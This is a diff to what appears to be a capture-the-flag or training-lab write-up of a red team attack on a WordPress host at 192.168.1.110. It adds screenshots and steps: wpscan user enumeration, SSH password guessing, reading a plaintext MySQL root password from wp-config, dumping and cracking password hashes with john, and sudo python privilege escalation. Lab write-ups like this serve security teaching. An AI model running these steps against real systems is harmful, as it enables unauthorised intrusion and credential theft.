@@ -365,18 +365,22 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         - Ran `wpscan` to enumerate users
           - `wpscan --url http://192.168.1.110/wordpress --enumerate u`
         - Then SSH into *target1* by guessing password of *michael*
-          - `ssh michael@192.168.1.110`
+          - `ssh michael@192.168.1.110` <br>
+          ![SSH with michael](Images\ssh_michael.png)
         - Run `grep` command to search for the string 'flag' in `/var/www`
-          - `grep -iR flag1`
+          - `grep -iR flag1` <br>
+          ![Flag1 - Grep](Images\flag1_grep.png)
       
       - Method 2
         - Checked page sources of pages
-        - Flag located in `http://192.168.1.110/service.html`
+        - Flag located in `http://192.168.1.110/service.html` <br>
+        ![Flag1 - View Source](Images\flag1_source.png)
 
 
   - `flag2.txt`: fc3fd58dcdad9ab23faca6e9a36e581c
     - **Exploit Used**
       - SSH into *target1* by guessing password of *michael*
+          ![SSH with michael](Images\ssh_michael.png)
       - Searching directory for *flag2*
         - `find . -iname flag2`
       - Located `/var/www/flag2.txt`
@@ -387,16 +391,18 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     - **Exploit Used**
       - Obtained password stored in plain text
         - `/var/www/html/wordpress/wp-config.php`
-      - Obtained hashes from `wordpress` database `wp_users`
+        <br> ![wp-config](Images\wp-config.png)
+      - Access MySQL databases
         ```bash
         michael@target1:/var/www/html$ mysql -u root -pR@v3nSecurity
         ```
+        ![MySQL Access](Images\mysql_access.png)
+      - Obtained hashes from `wordpress` database `wp_users`
         ```sql
-        show databases;
         use wordpress;
-        show tables;
         select * from wp_users;
         ```
+        ![MySQL Users](Images\mysql_users.png)
       - Created text file with content
         ```bash
         root@Kali:~# nano wordpresspw
@@ -405,12 +411,14 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
         michael:$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
         steven:$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/
         ```
+      - Cracked password using `john`
         ```bash
         root@Kali:~# john --wordlist=rockyou.txt wordpresspw
-
         ```
+        ![cracking stevens password with john](Images\john_steven.png)
       - Logged into Wordpress admin
-      - Checked `Posts > All Posts > Located *flag3 - Draft*`
+      - Checked `Posts > All Posts > Located *flag3 - Draft*` <br>
+      ![flag3](Images\flag3.png)
 
   - `flag4.txt`: 715dea6c055b9fe3337544932f2941ce
 
@@ -434,4 +442,11 @@ The Red Team was able to penetrate `Target 1` and retrieve the following confide
     @mccannwj / wjmccann.github.io
     ```
     - **Exploit Used**
-      - 
+      - SSH into `target1` using username and password cracked from john <br>
+      ![SSH with steven's account](Images\ssh_steven.png)
+      - List sudo privileges of the account *steven* <br>
+      ![sudo -l](Images\sudo.png)
+      - Exploit *steven*'s ability to run python as *sudo* <br>
+      ![Privilege Escalation with Python](Images\python_privesc.png)
+      - Using `cat` to view flag4.txt <br>
+      ![cat flag4.txt](Images\flag4.png)
